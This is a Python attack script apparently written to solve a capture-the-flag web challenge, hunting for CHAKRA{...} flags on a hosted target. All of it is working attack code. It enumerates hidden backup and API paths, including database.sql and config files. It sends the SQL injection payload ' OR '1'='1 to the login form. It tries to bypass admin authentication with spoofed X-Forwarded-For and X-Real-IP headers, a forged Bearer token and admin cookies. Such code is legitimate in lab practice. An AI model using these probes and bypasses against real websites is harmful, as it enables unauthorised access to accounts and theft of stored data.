import requests, re

BASE = 'https://ghostpanel-ctf.onrender.com'
s = requests.Session()

def clean(html):
    t = re.sub(r'<[^>]+>','',html)
    return re.sub(r'\s+',' ',t).strip()

# robots.txt paths + JS
paths = ['/backup/', '/hidden-api', '/backup/flag.txt', '/backup/config.txt',
         '/backup/secret.txt', '/backup/employees.txt', '/backup/database.sql',
         '/hidden-api/flag', '/hidden-api/secret', '/hidden-api/users',
         '/hidden-api/admin', '/hidden-api/config', '/static/js/app.js']

for p in paths:
    r = s.get(BASE + p, timeout=12)
    flags = re.findall(r'CHAKRA\{[^}]+\}', r.text)
    print(f'[{r.status_code}] {p}: {clean(r.text)[:200]}')
    if flags: print('  FLAG:', flags)

# login SQLi
print('\n=== LOGIN SQLI ===')
sqli = "' OR '1'='1"
r = s.post(BASE + '/login', data={'username': sqli, 'password': sqli}, timeout=10, allow_redirects=True)
print(r.url, clean(r.text)[:300])
flags = re.findall(r'CHAKRA\{[^}]+\}', r.text)
if flags: print('FLAG:', flags)

# admin header bypass
print('\n=== ADMIN BYPASS ===')
for hdr in [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Admin': 'true'},
    {'Authorization': 'Bearer admin'},
    {'Cookie': 'admin=true; role=admin'},
]:
    r2 = s.get(BASE + '/admin', headers=hdr, timeout=8)
    flags2 = re.findall(r'CHAKRA\{[^}]+\}', r2.text)
    if flags2 or 'dashboard' in r2.text.lower():
        print(f'HIT {hdr}: {clean(r2.text)[:300]}')
        if flags2: print('FLAG:', flags2)
